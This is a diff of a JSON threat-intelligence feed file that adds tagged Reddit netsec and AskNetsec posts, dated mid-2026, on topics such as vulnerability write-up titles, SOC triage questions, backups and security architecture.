+      "summary": "Hello everyone. I'm analyzing a project and found the following vulnerabilities: · No brute-force protection (no captcha, no rate limiting) · No 2FA · Open .config, .log, .php.ini files in root · Server version disclosure · Missing security headers (CSP, HSTS, X-Frame-Options) Question for the community: if you were a pentester and had access to such a site for a penetration test, what chain of actions would you build? I'm not looking for instructions to hack, just theoretical methodology for learning purposes. The site name is intentionally hidden. Thanks in advance! submitted by /u/Human_Leave1712 [link] [comments]",
+      "author": "/u/Human_Leave1712",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
     },
     {
       "source": "The Hacker News",
@@ -6890,6 +6805,34 @@
       "fetch_status": "ok"
     },
     {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Do you expect your security architect to plan response?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1uowi5n/do_you_expect_your_security_architect_to_plan/",
+      "published": "2026-07-06T12:53:07+00:00",
+      "summary": "I've spent 17+ years in security - networking, red teaming, SOC, and these days security architecture. Sanity check time: either I'm missing something, or most architects around me are doing only half the job. Everyone agrees an architect needs deep knowledge of the tech stack. Most people also agree they need to respect legacy and business constraints - design for the environment that exists, not the one in the reference diagram. But here's the third thing, and this is where I want the pushback: I think response has to be planned at design time, and the security architect is the one who has to plan it. Not \"hand the design over and let the SOC figure out monitoring.\" I mean at the design phase: know which attack paths stay realistic after your trade-offs, understand what the SOC can and can't realistically cover, plan which logs and telemetry your design must generate for those paths - and only then go to the SOC to confirm readiness. Defense and response designed from the same chair.",
+      "author": "/u/gopherz_",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
+    },
+    {
       "source": "Check Point Research",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -7182,6 +7125,33 @@
       "fetch_status": "ok"
     },
     {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "AI alert-summarization tool that actually reduces triage time?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1uo554k/ai_alertsummarization_tool_that_actually_reduces/",
+      "published": "2026-07-05T15:32:48+00:00",
+      "summary": "copilot has been completely useless for actual triaging. whoever decided every alert needs an AI summary owes me hours of my life back. \"possible suspicious activity detected based on observed behavioral patterns.\" thanks. that tells me exactly as much as the alert title did. if i still have to open the process tree and check parent processes and look at network connections and pivot through logs and build the timeline myself... what exactly did the AI save me? just hire more analysts at this point. anyone actually found one that helps or is this just how it is now submitted by /u/Mind-Principle-1834 [link] [comments]",
+      "author": "/u/Mind-Principle-1834",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Simon Willison",
       "cohort": "ai_security_agentic_risk",
       "category": "ai_security_agentic_risk",
@@ -7296,6 +7266,33 @@
         "role_map": {
           "Anthropic/Claude": "target"
         },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Can Malware Transfer Through Wifi",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1un6pce/can_malware_transfer_through_wifi/",
+      "published": "2026-07-04T11:30:20+00:00",
+      "summary": "Yo so I've been wondering since my brother tends to have not so safe internet habits, if potential malware from his laptop can potentially transfer to other devices that also share the same WiFi/network. Also does proximity matter (like side by side Vs in another room). And also if malware could transfer, how to prevent it since I can't control what my brother does. Also I can't do anything router related since it's up to my dad and he doesn't care as much about malware. Essentially, is it possible? How to prevent it? Is it likely? submitted by /u/WilliedWegdies [link] [comments]",
+      "author": "/u/WilliedWegdies",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
@@ -7549,6 +7546,33 @@
       }
     },
     {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Require Help With LVM snapshot and recovery. How can LVM snapshot happen with zero VFree?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1umd3uk/require_help_with_lvm_snapshot_and_recovery_how/",
+      "published": "2026-07-03T12:26:43+00:00",
+      "summary": "Require Help With LVM snapshot and recovery So, I tried creating a snapshot and changing the logical volume to a .gz file and then I have backed up in our nas box now what I want is to use that .gz file and use that config in the fresh newer installed os so that I can prove recovery is possible. Constraints LV available is 0. So, I'm using a pendrive and and using lvext3nd to create a new LV for the pc and then using that I'm creating .gz and that is what being saved and is being backed up to nas My other question also if there is a running unbutu PC can we put LVM and luks or only while installing it can happen? submitted by /u/Slayerma [link] [comments]",
+      "author": "/u/Slayerma",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Infosecurity Magazine",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -7686,6 +7710,33 @@
         "urgency_signals": [],
         "content_type": "low_signal",
         "confidence_tier": "tier_3_analysis",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Why do some seemingly low risk accounts require such secure passwords?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1um5ybd/why_do_some_seemingly_low_risk_accounts_require/",
+      "published": "2026-07-03T05:51:55+00:00",
+      "summary": "Was signing up for a supermarket loyalty card, and the password requirements includes: At least 12 characters At least one special character from: !\\\"$%&'()*+,-./:;<=>?@[\\]^_^{}~ I do understand it's to not be hacked etc, but, why such a secure password for a loyalty card? Passwords for things like banks and other services in my experience have essentially half the requirements, and other loyalty cards I've used have, once again, requirements that aren't close? submitted by /u/Mince-And-Cheese-Pie [link] [comments]",
+      "author": "/u/Mince-And-Cheese-Pie",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -8093,6 +8144,33 @@
       }
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "It’s 37oC, And All We Can Think About Is ColdFusion (Adobe ColdFusion Security Bulletin APSB26-68 CVE Bonanza) - watchTowr Labs",
+      "link": "https://www.reddit.com/r/netsec/comments/1ulndzc/its_37oc_and_all_we_can_think_about_is_coldfusion/",
+      "published": "2026-07-02T16:40:38+00:00",
+      "summary": "submitted by /u/dx7r__ [link] [comments]",
+      "author": "/u/dx7r__",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "watchTowr Labs",
       "cohort": "offensive_vulnerability_research",
       "category": "offensive_vulnerability_research",
@@ -8113,6 +8191,60 @@
         "urgency_signals": [],
         "content_type": "threat_research",
         "confidence_tier": "tier_1_offensive_research",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "how much monitoring is enough for card fraud?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1ulmx2l/how_much_monitoring_is_enough_for_card_fraud/",
+      "published": "2026-07-02T16:23:12+00:00",
+      "summary": "I was reading through fraud setups for card programs and the advice always brings up more monitoring like that’s a clear answer but if u keep layering alerts rules and manual review on top of each other it feels like you just end up watching everything and understanding nothing. Where does that tipping point hit where extra monitoring stops reducing risk and only burns time? submitted by /u/FutureTrip1646 [link] [comments]",
+      "author": "/u/FutureTrip1646",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "FIFA was saved this time",
+      "link": "https://www.reddit.com/r/netsec/comments/1ulmoyx/fifa_was_saved_this_time/",
+      "published": "2026-07-02T16:14:57+00:00",
+      "summary": "submitted by /u/scorp100n [link] [comments]",
+      "author": "/u/scorp100n",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -8167,6 +8299,33 @@
         "urgency_signals": [],
         "content_type": "low_signal",
         "confidence_tier": "tier_1_offensive_research",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Is “patch faster” enough if sensitive services remain reachable by default?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1uljf0d/is_patch_faster_enough_if_sensitive_services/",
+      "published": "2026-07-02T14:11:54+00:00",
+      "summary": "We’ve been discussing in the Cloud Security Alliance Zero Trust group how AI-speed vulnerability discovery changes Zero Trust implementation. Time-to-exploit trends suggest defenders have less time to patch exposed services, and CISA’s risk-based remediation approach treats public exposure as a major factor in urgency. That made me think the architectural question is not only “how do we patch faster?” but also: Why are so many sensitive services reachable by default in the first place? My view is that Zero Trust needs to move beyond perimeter/ZTNA framing and focus more on reducing reachability before connection. For private services, admin paths, APIs, workload paths, partner access, and agentic workflows, the safer default should be: no service path exists unless identity, policy, posture/context, and session state allow it. I wrote this up for CSA here: https://cloudsecurityalliance.org/blog/2026/07/02/ai-speed-risk-requires-identity-defined-reachability Disclosure: I’m the author a",
+      "author": "/u/PhilipLGriffiths88",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -8312,6 +8471,35 @@
         ],
         "content_type": "news_report",
         "confidence_tier": "tier_4_news",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "110M creds harvested from network devices, what does this say about what we're actually monitoring?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1ulh767/110m_creds_harvested_from_network_devices_what/",
+      "published": "2026-07-02T12:42:23+00:00",
+      "summary": "saw the writeup on the FortiBleed campaign that just got tied to actual ransomware deployment. 400k+ firewalls hit, 110M+ credentials harvested via passive sniffing, and it only came to light because of an OPSEC mistake on the attacker's side, a server full of stolen creds got left exposed. nobody caught this from the defense side, it just got found by accident. makes me think about how much of our identity monitoring is built around human logins, SSO events, MFA prompts, the stuff that shows up in a normal audit log. versus how much visibility we actually have into service accounts and machine credentials sitting on infra that was never really in scope to begin with. don't know for sure how much of what got harvested here falls into that bucket, but firewall-layer credential exposure at this scale makes me wonder how many orgs would even notice if it happened to them, regardless of which type of credential it was. anyone actually tried bringing service accounts and machine credentials",
+      "author": "/u/Alone_Bread5045",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -8579,6 +8767,62 @@
       }
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "/r/netsec's Q3 2026 Information Security Hiring Thread",
+      "link": "https://www.reddit.com/r/netsec/comments/1ulbf96/rnetsecs_q3_2026_information_security_hiring/",
+      "published": "2026-07-02T07:32:10+00:00",
+      "summary": "Overview If you have open positions at your company for information security professionals and would like to hire from the /r/netsec user base, please leave a comment detailing any open job listings at your company. We would also like to encourage you to post internship positions as well. Many of our readers are currently in school or are just finishing their education. Please reserve top level comments for those posting open positions. Rules & Guidelines Include the company name in the post. If you want to be topsykret, go recruit elsewhere. Include the geographic location of the position along with the availability of relocation assistance or remote work. If you are a third party recruiter, you must disclose this in your posting. Please be thorough and upfront with the position details. Use of non-hr'd (realistic) requirements is encouraged. While it's fine to link to the position on your companies website, provide the important details in the comment. Mention if applicants should ap",
+      "author": "/u/netsec_burn",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "education"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "AI security rules keep assuming a network boundary that doesn't exist anymore",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1ulalf1/ai_security_rules_keep_assuming_a_network/",
+      "published": "2026-07-02T06:44:01+00:00",
+      "summary": "Spent a few days last quarter writing something to control what could reach the internet, got it approved and put it live without much trouble. 3 weeks later someone noticed traffic going to a service nobody had signed off on What we put in place targeted specific domains, but the team had been using the same service through a browser extension the whole time, so it slipped right past. That's when it hit me the whole thing assumed something that isn't really there anymore. Browser extensions, embedded features inside approved platforms, calls from software that was already allowed and plenty of activity that never gets inspected at all. How are others enforcing this without trying to block every possible path? submitted by /u/Icy-Journalist-2556 [link] [comments]",
+      "author": "/u/Icy-Journalist-2556",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Risky Business News",
       "cohort": "practitioner_analysis",
       "category": "practitioner_analysis",
@@ -8826,6 +9070,33 @@
         "urgency_signals": [],
         "content_type": "low_signal",
         "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "How to make a server backup secure?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1ukwjip/how_to_make_a_server_backup_secure/",
+      "published": "2026-07-01T20:08:36+00:00",
+      "summary": "Good evening everyone, Unfortunately, English is not my native language, so I'm using a translator. I hope you understand what I'm trying to say. I am currently setting up my own homo server with various functions, including digital file management for everything . Since I want to do everything right, I'm already looking into security and how to make an encrypted backup that's stored in the cloud.I know one can debate why the cloud is the best option, but currently it's the most convenient for me unless someone has a better idea. My question is, what standards should I set for safety? I would like to ensure it's secure for the next few decades; I am of course aware that this includes backups and checking for newer options.However, it is important to me that it is already quantum-safe, since the data can potentially be stored.I'm not a conspiracy theorist; probably no one cares about my bills, but I'm still suspicious of everyone at first. According to current knowledge, AES 256 is suff",
+      "author": "/u/NovelMechanic6991",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -9113,6 +9384,35 @@
       }
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Privilege escalation to root in Lima QEMU guests via a world-writable agent socket (CVE-2026-53657)",
+      "link": "https://www.reddit.com/r/netsec/comments/1uknvr4/privilege_escalation_to_root_in_lima_qemu_guests/",
+      "published": "2026-07-01T14:52:02+00:00",
+      "summary": "submitted by /u/Sandwich_1337 [link] [comments]",
+      "author": "/u/Sandwich_1337",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-53657"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "vulnerability_disclosure",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Infosecurity Magazine",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -9193,6 +9493,33 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_4_news",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "r/netsec monthly discussion & tool thread",
+      "link": "https://www.reddit.com/r/netsec/comments/1uklqx3/rnetsec_monthly_discussion_tool_thread/",
+      "published": "2026-07-01T13:29:07+00:00",
+      "summary": "Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links. Rules & Guidelines Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary. Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely. If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely. Avoid use of memes. If you have something to say, say it with real words. All discussions and questions should directly relate to netsec. No tech support is to be requested or provided on r/netsec . As always, the content & discussion guidelines should also be observed on r/netsec . Feedback Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox. submitted by /u/albinowax [link] [comments]",
+      "author": "/u/albinowax",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -9546,6 +9873,35 @@
       }
     },
     {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "SOC question – Wazuh/Sysmon PowerShell alert, true positive or false positive?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1ukgk7z/soc_question_wazuhsysmon_powershell_alert_true/",
+      "published": "2026-07-01T09:13:33+00:00",
+      "summary": "Hi everyone, I'm new to SOC and currently learning Wazuh, Sysmon, and alert analysis in a lab environment. I received an alert that I'm trying to understand better and would appreciate guidance on how an analyst would investigate it. The Wazuh rule triggered: Rule ID: 92213 Description: \"Executable file dropped in folder commonly used by malware (Lowered Severity)\" MITRE: T1105 – Ingress Tool Transfer Important details: Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe File created: C:\\Users\\someone\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cebr0opm.pas.ps1 Sysmon Event ID: 11 (File Create) What confuses me is the filename: __PSScriptPolicyTest_*.ps1 I found some information suggesting PowerShell can create temporary files while checking execution policies, but I’m not sure whether this should be considered suspicious behavior or expected activity. My questions: Would you classify this as a true positive or false positive? What would be your first investigation steps? Wh",
+      "author": "/u/NullTraceReal",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [
+          "T1105"
+        ],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Infosecurity Magazine",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -9570,6 +9926,33 @@
         "urgency_signals": [],
         "content_type": "incident_report",
         "confidence_tier": "tier_4_news",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "What are you using to collect, calculate, and report security KPIs?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1ukfikp/what_are_you_using_to_collect_calculate_and/",
+      "published": "2026-07-01T08:09:51+00:00",
+      "summary": "Hi everyone; I've been looking around and haven't found a tool that lets you actually define and track your own KPIs. Not control compliance I mean real KPI tracking: define the metric, track it over time, report on it. Everything I find is either a GRC tool (compliance-focused, not KPI-focused) or a BI tool you have to bend into shape yourself. What's actually working for people here? Spreadsheets, Grafana, something built in-house, a GRC tool that secretly does this well? submitted by /u/No_Relief3499 [link] [comments]",
+      "author": "/u/No_Relief3499",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -9966,6 +10349,41 @@
         "confidence_tier": "tier_2_operator",
         "role_map": {
           "Azure": "target"
+        },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "CitrixBleed To Infinity And Beyond (Citrix NetScaler Pre-Auth Memory Overread CVE-2026-8451) - watchTowr Labs",
+      "link": "https://www.reddit.com/r/netsec/comments/1ujzc5y/citrixbleed_to_infinity_and_beyond_citrix/",
+      "published": "2026-06-30T19:40:48+00:00",
+      "summary": "submitted by /u/dx7r__ [link] [comments]",
+      "author": "/u/dx7r__",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Citrix"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-8451"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": "vulnerability_disclosure",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {
+          "Citrix": "target"
         },
         "weak_tags": {
           "products": []
@@ -10626,6 +11044,35 @@
       }
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Auditing OpenReception: 16 CVEs in an end-to-end encrypted appointment booking platform (unauthenticated admin creation, account takeover, E2E bypass)",
+      "link": "https://www.reddit.com/r/netsec/comments/1ujl1k0/auditing_openreception_16_cves_in_an_endtoend/",
+      "published": "2026-06-30T10:07:33+00:00",
+      "summary": "submitted by /u/moltenbit-r [link] [comments]",
+      "author": "/u/moltenbit-r",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Kaspersky Securelist",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -10878,6 +11325,37 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Enterprise Tech In, Shell Out (Progress Kemp LoadMaster Uninitialized Heap to Pre-Auth RCE CVE-2026-8037) - watchTowr Labs",
+      "link": "https://www.reddit.com/r/netsec/comments/1uj2a4w/enterprise_tech_in_shell_out_progress_kemp/",
+      "published": "2026-06-29T19:27:02+00:00",
+      "summary": "submitted by /u/dx7r__ [link] [comments]",
+      "author": "/u/dx7r__",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-8037"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": "vulnerability_disclosure",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -11740,6 +12218,87 @@
       }
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "I tried a Local AI model (Qwen 3.6 27b) for security research and it works surprisingly well.",
+      "link": "https://www.reddit.com/r/netsec/comments/1uhveou/i_tried_a_local_ai_model_qwen_36_27b_for_security/",
+      "published": "2026-06-28T11:56:40+00:00",
+      "summary": "submitted by /u/ezzzzz [link] [comments]",
+      "author": "/u/ezzzzz",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Dissecting Apple's Sparse Image Format (ASIF)",
+      "link": "https://www.reddit.com/r/netsec/comments/1uhue36/dissecting_apples_sparse_image_format_asif/",
+      "published": "2026-06-28T11:01:56+00:00",
+      "summary": "submitted by /u/luke-paradoxis [link] [comments]",
+      "author": "/u/luke-paradoxis",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "A peek into Reddit's anti-spam internals",
+      "link": "https://www.reddit.com/r/netsec/comments/1uh7zpx/a_peek_into_reddits_antispam_internals/",
+      "published": "2026-06-27T17:03:25+00:00",
+      "summary": "submitted by /u/rebane2001 [link] [comments]",
+      "author": "/u/rebane2001",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
